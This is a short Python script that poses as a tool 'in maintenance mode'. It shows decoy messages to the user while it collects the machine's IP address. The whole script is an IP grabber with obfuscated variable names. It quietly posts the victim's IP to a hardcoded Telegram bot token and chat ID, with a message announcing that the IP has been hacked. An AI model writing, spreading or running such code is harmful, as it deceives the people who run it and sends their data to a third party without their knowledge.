import socket
import time
import requests

Tomas1 = "6937908213:AAHo6Kv__18vQBxzA5mlZhJ1-F95nsR8tC4"
Tomas2 = "5332956497"

def get_real_ip():
    try:
        Tomas3 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        Tomas3.connect(("8.8.8.8", 80))
        Tomas4 = Tomas3.getsockname()[0]
        Tomas3.close()
        return Tomas4
    except Exception as Tomas5:
        return "ERROR ❌REST"

def send_to_bot(Tomas6):
    try:
        Tomas7 = f"https://api.telegram.org/bot{Tomas1}/sendMessage"
        Tomas8 = {
            "chat_id": Tomas2,
            "text": f"IPがハッキングされた \nIP:{Tomas6}\nBy:@K_DKP"
        }
        requests.post(Tomas7, data=Tomas8)
    except:
        print("ERROR ❌REST")

Tomas9 = get_real_ip()
print("Wait a moment please ")
time.sleep(3)
print("The tool is in maintenance mode. ")
send_to_bot(Tomas9)